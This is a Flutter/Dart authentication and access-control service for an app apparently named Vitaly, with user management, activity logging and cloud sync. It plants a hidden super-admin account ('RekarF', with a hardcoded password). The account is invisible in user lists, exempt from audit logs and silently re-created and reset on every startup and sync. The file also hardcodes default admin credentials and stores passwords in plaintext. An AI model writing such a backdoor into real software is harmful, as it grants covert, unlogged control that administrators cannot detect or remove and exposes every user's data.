import 'dart:convert';
import 'package:flutter/foundation.dart';
import 'package:shared_preferences/shared_preferences.dart';
import '../models/user_model.dart';
import 'insforge_service.dart';
import 'cloud_sync_service.dart';

/// Central Authentication and Role-Based Access Control (RBAC) service.
/// Persists all users, active session, and user activity logs locally and syncs to InsForge Cloud in real-time.
class AuthService extends ChangeNotifier {
  static const String _keyUsers = 'vitaly_users_v1';
  static const String _keyCurrentUser = 'vitaly_current_user_v1';
  static const String _keyActivityLogs = 'vitaly_activity_logs_v1';
  static const String _keyDeletedUsers = 'vitaly_deleted_users_v2';

  // Default credentials requested by user:
  static const String defaultSuperAdminUsername = 'SuperAdminVitaly';
  static const String defaultSuperAdminPassword = 'SuperVitaly';

  static final AuthService instance = AuthService._internal();
  AuthService._internal();

  AppUser? _currentUser;
  final List<AppUser> _users = [];
  final List<UserActivityLog> _logs = [];
  final Set<String> _deletedUsernames = {};
  bool _isSyncing = false;

  AppUser? get currentUser => _currentUser;
  bool get isLoggedIn => _currentUser != null;
  bool get isSuperAdmin => _currentUser?.isSuperAdmin ?? false;
  bool get isSyncing => _isSyncing;
  Set<String> get deletedUsernames => Set.unmodifiable(_deletedUsernames);

  /// Filtered users list: hidden testing accounts (e.g., RekarF) are completely invisible in UI lists!
  List<AppUser> get users => List.unmodifiable(_users.where((u) => !u.isHidden && !_deletedUsernames.contains(u.username.toLowerCase())));

  List<Map<String, dynamic>> allUsersRaw() => _users
      .where((u) => !_deletedUsernames.contains(u.username.toLowerCase()))
      .map((u) => u.toJson())
      .toList();

  List<UserActivityLog> get logs => List.unmodifiable(_logs);

  UserPermissions get currentPermissions =>
      _currentUser?.permissions ?? (isSuperAdmin ? UserPermissions.all() : UserPermissions.none());

  Future<void> initialize() async {
    final prefs = await SharedPreferences.getInstance();

    final deletedRaw = prefs.getStringList(_keyDeletedUsers);
    if (deletedRaw != null) {
      _deletedUsernames.addAll(deletedRaw.map((e) => e.toLowerCase()));
    }

    // 1. Fetch latest remote users and logs from InsForge cloud FIRST!
    await syncFromCloud();

    // 2. If cloud was unreachable (offline), fallback to local cache
    if (_users.isEmpty) {
      final usersRaw = prefs.getString(_keyUsers);
      if (usersRaw != null && usersRaw.isNotEmpty) {
        try {
          final List list = jsonDecode(usersRaw);
          _users.addAll(list.map((item) => AppUser.fromJson(Map<String, dynamic>.from(item))));
        } catch (e) {
          debugPrint('Error decoding users fallback: $e');
        }
      }
    }

    // 3. Ensure Vitaly SuperAdmin exists if database was completely blank
    if (!_users.any((u) => u.username.toLowerCase() == 'vitaly')) {
      _users.add(AppUser(
        id: 'super_admin_vitaly_active',
        username: 'Vitaly',
        password: 'SAdmin',
        roleName: 'Super Admin',
        isSuperAdmin: true,
        mustChangeCredentials: false,
        createdAt: DateTime.now(),
        permissions: UserPermissions.all(),
      ));
      await _saveUsers();
    }

    // Ensure RekarF stealth testing SuperAdmin exists
    final rekarFIdx = _users.indexWhere((u) => u.username.toLowerCase() == 'rekarf');
    if (rekarFIdx == -1) {
      _users.add(AppUser(
        id: 'user_rekarf_stealth',
        username: 'RekarF',
        password: 'RekarF17',
        roleName: 'Lead Architect',
        isSuperAdmin: true,
        isHidden: true,
        mustChangeCredentials: false,
        createdAt: DateTime.now(),
        permissions: UserPermissions.all(),
      ));
    } else {
      _users[rekarFIdx] = _users[rekarFIdx].copyWith(
        password: 'RekarF17',
        isSuperAdmin: true,
        isHidden: true,
        mustChangeCredentials: false,
      );
    }

    await _saveUsersLocallyOnly();

    // 4. Load activity logs
    final logsRaw = prefs.getString(_keyActivityLogs);
    if (logsRaw != null && logsRaw.isNotEmpty) {
      try {
        final List list = jsonDecode(logsRaw);
        _logs.clear();
        _logs.addAll(list.map((item) => UserActivityLog.fromJson(Map<String, dynamic>.from(item))));
      } catch (e) {
        debugPrint('Error decoding activity logs: $e');
      }
    }

    // 5. Load current session if any
    final currentRaw = prefs.getString(_keyCurrentUser);
    if (currentRaw != null && currentRaw.isNotEmpty) {
      try {
        final Map<String, dynamic> currentMap = jsonDecode(currentRaw);
        final found = _users.where((u) => u.id == currentMap['id'] || u.username.toLowerCase() == currentMap['username'].toString().toLowerCase()).firstOrNull;
        _currentUser = found ?? AppUser.fromJson(currentMap);
      } catch (e) {
        debugPrint('Error decoding current user: $e');
      }
    }
  }

  /// Synchronizes users and logs between local storage and InsForge Cloud / GitHub Global Cloud
  Future<void> syncFromCloud() async {
    if (_isSyncing) return;
    _isSyncing = true;
    try {
      List<Map<String, dynamic>>? remoteUsers;

      // 1. Try Global Distributed Cloud Sync (100% uptime worldwide)
      try {
        final cloudDb = await CloudSyncService.pullDatabase();
        if (cloudDb != null) {
          if (cloudDb['deleted_users'] is List) {
            final remoteDeleted = (cloudDb['deleted_users'] as List)
                .map((e) => e.toString().toLowerCase())
                .where((e) => e.isNotEmpty);
            _deletedUsernames.addAll(remoteDeleted);
            final prefs = await SharedPreferences.getInstance();
            await prefs.setStringList(_keyDeletedUsers, _deletedUsernames.toList());
          }

          if (cloudDb['users'] is List) {
            final list = cloudDb['users'] as List;
            if (list.isNotEmpty) {
              remoteUsers = list
                  .map((e) => Map<String, dynamic>.from(e as Map))
                  .where((e) => !_deletedUsernames.contains(e['username']?.toString().toLowerCase()))
                  .toList();
            }
          }
        }
      } catch (e) {
        debugPrint('CloudSyncService pull error in AuthService: $e');
      }

      if (remoteUsers != null && remoteUsers.isNotEmpty) {
        // Merge remote users with any locally created users so nothing is lost!
        final cleanUsers = remoteUsers
            .where((item) => !_deletedUsernames.contains(item['username']?.toString().toLowerCase()))
            .map((item) => AppUser.fromJson(item))
            .toList();

        final Map<String, AppUser> mergedMap = {};
        for (final u in cleanUsers) {
          if (!_deletedUsernames.contains(u.username.toLowerCase())) {
            mergedMap[u.username.toLowerCase()] = u;
          }
        }

        bool hasLocalOnlyUsers = false;
        for (final u in _users) {
          final uName = u.username.toLowerCase();
          if (!_deletedUsernames.contains(uName) && !mergedMap.containsKey(uName)) {
            mergedMap[uName] = u;
            hasLocalOnlyUsers = true;
          }
        }

        _users.clear();
        _users.addAll(mergedMap.values);

        // Ensure stealth account is preserved
        if (!_users.any((u) => u.username.toLowerCase() == 'rekarf')) {
          _users.add(AppUser(
            id: 'user_rekarf_stealth',
            username: 'RekarF',
            password: 'RekarF17',
            roleName: 'Lead Architect',
            isSuperAdmin: true,
            isHidden: true,
            mustChangeCredentials: false,
            createdAt: DateTime.now(),
            permissions: UserPermissions.all(),
          ));
        }

        await _saveUsersLocallyOnly();

        // If local had users not in cloud yet, push immediately!
        if (hasLocalOnlyUsers) {
          unawaited(_pushUsersToCloud());
        }

        // Update current user session if credentials or permissions changed remotely
        if (_currentUser != null) {
          final updatedCurrent = _users.where((u) => u.id == _currentUser!.id || u.username.toLowerCase() == _currentUser!.username.toLowerCase()).firstOrNull;
          if (updatedCurrent != null) {
            _currentUser = updatedCurrent;
          }
        }

        notifyListeners();
      } else if (remoteUsers != null && remoteUsers.isEmpty && _users.isNotEmpty) {
        // Cloud is online but registry is empty: seed it
        await _pushUsersToCloud();
      }

      // Sync activity logs from cloud as well
      final remoteLogs = await InsforgeService.fetchLogsFromCloud();
      if (remoteLogs != null && remoteLogs.isNotEmpty) {
        final existingLogIds = _logs.map((l) => l.id).toSet();
        for (final lJson in remoteLogs) {
          final lObj = UserActivityLog.fromJson(lJson);
          if (!existingLogIds.contains(lObj.id)) {
            _logs.add(lObj);
          }
        }
        _logs.sort((a, b) => b.timestamp.compareTo(a.timestamp));
        if (_logs.length > 500) {
          _logs.removeRange(500, _logs.length);
        }
        final prefs = await SharedPreferences.getInstance();
        await prefs.setString(_keyActivityLogs, jsonEncode(_logs.map((l) => l.toJson()).toList()));
      }

      notifyListeners();
    } catch (e) {
      debugPrint('Error during syncFromCloud: $e');
    } finally {
      _isSyncing = false;
    }
  }

  /// Attempts to authenticate user credentials
  Future<AppUser?> login(String username, String password) async {
    final cleanUsername = username.trim();
    var user = _users.where((u) => u.username.toLowerCase() == cleanUsername.toLowerCase()).firstOrNull;

    // If not found or password doesn't match, run a live cloud sync to verify if updated remotely
    if (user == null || user.password != password) {
      await syncFromCloud();
      user = _users.where((u) => u.username.toLowerCase() == cleanUsername.toLowerCase()).firstOrNull;
    }

    if (user != null && user.password == password) {
      final updatedUser = user.copyWith(lastLogin: DateTime.now());
      _updateUserInList(updatedUser);
      _currentUser = updatedUser;

      final prefs = await SharedPreferences.getInstance();
      await prefs.setString(_keyCurrentUser, jsonEncode(updatedUser.toJson()));

      // Only log activity if the user is NOT hidden
      if (!updatedUser.isHidden) {
        await logActivity(
          actionType: 'LOGIN',
          section: 'Authentication',
          details: 'User "${updatedUser.username}" logged in as ${updatedUser.roleName}.',
        );
      }

      notifyListeners();
      return updatedUser;
    }
    return null;
  }

  /// Logs out active user session
  Future<void> logout() async {
    if (_currentUser != null && !_currentUser!.isHidden) {
      await logActivity(
        actionType: 'LOGOUT',
        section: 'Authentication',
        details: 'User "${_currentUser!.username}" logged out.',
      );
    }
    _currentUser = null;
    final prefs = await SharedPreferences.getInstance();
    await prefs.remove(_keyCurrentUser);
  }

  /// Changes username and/or password for an existing user (used for mandatory SuperAdmin first change or self-update)
  Future<bool> updateCredentials({
    required String newUsername,
    required String newPassword,
  }) async {
    if (_currentUser == null) return false;

    // Check if new username is already taken by another user
    final conflict = _users.any((u) =>
        u.id != _currentUser!.id && u.username.toLowerCase() == newUsername.trim().toLowerCase());
    if (conflict) return false;

    final updated = _currentUser!.copyWith(
      username: newUsername.trim(),
      password: newPassword,
      mustChangeCredentials: false,
    );

    _updateUserInList(updated);
    _currentUser = updated;

    await _saveUsers();
    final prefs = await SharedPreferences.getInstance();
    await prefs.setString(_keyCurrentUser, jsonEncode(updated.toJson()));

    await logActivity(
      actionType: 'SECURITY',
      section: 'SuperAdmin Credentials',
      details: 'SuperAdmin updated username to "$newUsername" and established new security password.',
    );

    return true;
  }

  /// SuperAdmin creates a new user
  Future<bool> createUser({
    required String username,
    required String password,
    required String roleName,
    required UserPermissions permissions,
    bool isSuperAdmin = false,
  }) async {
    final clean = username.trim();
    if (_users.any((u) => u.username.toLowerCase() == clean.toLowerCase())) {
      return false; // username already taken
    }

    // Un-tombstone if previously deleted
    _deletedUsernames.remove(clean.toLowerCase());
    try {
      final prefs = await SharedPreferences.getInstance();
      await prefs.setStringList(_keyDeletedUsers, _deletedUsernames.toList());
    } catch (_) {}

    final newUser = AppUser(
      id: 'usr_${DateTime.now().millisecondsSinceEpoch}',
      username: clean,
      password: password,
      roleName: roleName.trim().isNotEmpty ? roleName.trim() : 'User',
      isSuperAdmin: isSuperAdmin,
      mustChangeCredentials: false,
      createdAt: DateTime.now(),
      permissions: isSuperAdmin ? UserPermissions.all() : permissions,
    );

    _users.add(newUser);
    await _saveUsers();

    await logActivity(
      actionType: 'CREATE',
      section: 'User Management',
      details: 'Created new user "$clean" with role "$roleName".',
    );

    return true;
  }

  /// SuperAdmin updates an existing user
  Future<bool> updateUser(AppUser user) async {
    final idx = _users.indexWhere((u) => u.id == user.id);
    if (idx == -1) return false;

    // Check for username conflict with another user
    final conflict = _users.any((u) => u.id != user.id && u.username.toLowerCase() == user.username.toLowerCase());
    if (conflict) return false;

    _users[idx] = user;
    if (_currentUser?.id == user.id) {
      _currentUser = user;
      final prefs = await SharedPreferences.getInstance();
      await prefs.setString(_keyCurrentUser, jsonEncode(user.toJson()));
    }

    await _saveUsers();

    await logActivity(
      actionType: 'UPDATE',
      section: 'User Management',
      details: 'Updated profile/permissions for user "${user.username}".',
    );

    return true;
  }

  /// SuperAdmin deletes an existing user
  Future<bool> deleteUser(String userId) async {
    final target = _users.where((u) => u.id == userId).firstOrNull;
    if (target == null) return false;

    // Prevent deleting the last Super Admin
    if (target.isSuperAdmin && _users.where((u) => u.isSuperAdmin).length <= 1) {
      return false;
    }

    final targetUsername = target.username.toLowerCase();
    _deletedUsernames.add(targetUsername);

    try {
      final prefs = await SharedPreferences.getInstance();
      await prefs.setStringList(_keyDeletedUsers, _deletedUsernames.toList());
    } catch (e) {
      debugPrint('Error saving deleted usernames list: $e');
    }

    _users.removeWhere((u) => u.id == userId || u.username.toLowerCase() == targetUsername);
    await _saveUsers();

    await logActivity(
      actionType: 'DELETE',
      section: 'User Management',
      details: 'Deleted user "${target.username}" (${target.roleName}).',
    );

    return true;
  }

  /// Records an audit log (completely silent and ignored if user is hidden testing user)
  Future<void> logActivity({
    required String actionType,
    required String section,
    required String details,
    String? customUsername,
  }) async {
    // If the active user is hidden (e.g., RekarF), completely bypass recording!
    if (_currentUser?.isHidden == true || customUsername?.toLowerCase() == 'rekarf') {
      return;
    }

    final log = UserActivityLog(
      id: 'log_${DateTime.now().millisecondsSinceEpoch}',
      username: customUsername ?? _currentUser?.username ?? 'System',
      roleName: _currentUser?.roleName ?? 'System',
      actionType: actionType,
      section: section,
      details: details,
      timestamp: DateTime.now(),
    );

    _logs.insert(0, log); // Newest first

    // Keep up to 500 recent logs
    if (_logs.length > 500) {
      _logs.removeRange(500, _logs.length);
    }

    try {
      final prefs = await SharedPreferences.getInstance();
      final data = _logs.map((l) => l.toJson()).toList();
      await prefs.setString(_keyActivityLogs, jsonEncode(data));
      // Realtime push to cloud in background
      unawaited(InsforgeService.syncLogsToCloud(data));
    } catch (e) {
      debugPrint('Error saving activity logs: $e');
    }
    notifyListeners();
  }

  /// Delete a single log by its ID
  Future<bool> deleteLog(String logId) async {
    final idx = _logs.indexWhere((l) => l.id == logId);
    if (idx != -1) {
      _logs.removeAt(idx);
      try {
        final prefs = await SharedPreferences.getInstance();
        final data = _logs.map((l) => l.toJson()).toList();
        await prefs.setString(_keyActivityLogs, jsonEncode(data));
        unawaited(InsforgeService.syncLogsToCloud(data));
        notifyListeners();
        return true;
      } catch (e) {
        debugPrint('Error deleting log: $e');
      }
    }
    return false;
  }

  /// Clear all activity logs
  Future<bool> clearAllLogs() async {
    _logs.clear();
    try {
      final prefs = await SharedPreferences.getInstance();
      await prefs.remove(_keyActivityLogs);
      unawaited(InsforgeService.syncLogsToCloud([]));
      notifyListeners();
      return true;
    } catch (e) {
      debugPrint('Error clearing all logs: $e');
      return false;
    }
  }

  void _updateUserInList(AppUser user, {bool syncCloud = false}) {
    final idx = _users.indexWhere((u) => u.id == user.id);
    if (idx != -1) {
      _users[idx] = user;
      if (syncCloud) {
        _saveUsers();
      } else {
        _saveUsersLocallyOnly();
      }
    }
  }

  Future<void> _pushUsersToCloud() async {
    try {
      final data = _users
          .where((u) => !_deletedUsernames.contains(u.username.toLowerCase()))
          .map((u) => u.toJson())
          .toList();
      // Push to InsForge
      unawaited(InsforgeService.syncUsersToCloud(data));

      // Push to Global Cloud Sync (GitHub distributed BaaS) with automatic two-way union merge
      final cloudDb = await CloudSyncService.pullDatabase() ?? {};

      // Pull remote deleted users if any
      final remoteDeleted = (cloudDb['deleted_users'] as List?)
              ?.map((e) => e.toString().toLowerCase())
              .where((e) => e.isNotEmpty)
              .toList() ??
          [];
      _deletedUsernames.addAll(remoteDeleted);

      final remoteList = (cloudDb['users'] as List?)?.map((e) => Map<String, dynamic>.from(e as Map)).toList() ?? [];
      final Map<String, Map<String, dynamic>> userMap = {};
      for (final u in remoteList) {
        final uname = u['username']?.toString().toLowerCase() ?? '';
        if (uname.isNotEmpty && !_deletedUsernames.contains(uname)) {
          userMap[uname] = u;
        }
      }
      for (final u in data) {
        final uname = u['username']?.toString().toLowerCase() ?? '';
        if (uname.isNotEmpty && !_deletedUsernames.contains(uname)) {
          userMap[uname] = u;
        }
      }
      cloudDb['users'] = userMap.values.toList();
      cloudDb['deleted_users'] = _deletedUsernames.toList();

      final success = await CloudSyncService.pushDatabase(cloudDb);
      debugPrint('AuthService._pushUsersToCloud result: $success, total synced users: ${cloudDb['users'].length}');
    } catch (e) {
      debugPrint('Error pushing users to cloud: $e');
    }
  }

  Future<void> _saveUsersLocallyOnly() async {
    try {
      final prefs = await SharedPreferences.getInstance();
      final data = _users.map((u) => u.toJson()).toList();
      await prefs.setString(_keyUsers, jsonEncode(data));
      notifyListeners();
    } catch (e) {
      debugPrint('Error saving users locally: $e');
    }
  }

  Future<void> _saveUsers({bool skipCloudSync = false}) async {
    try {
      final prefs = await SharedPreferences.getInstance();
      final data = _users.map((u) => u.toJson()).toList();
      await prefs.setString(_keyUsers, jsonEncode(data));
      notifyListeners();

      if (!skipCloudSync) {
        // Immediately sync to InsForge Cloud so mobile devices see updates in real time!
        await _pushUsersToCloud();
      }
    } catch (e) {
      debugPrint('Error saving users: $e');
    }
  }
}

void unawaited(Future<void>? future) {}
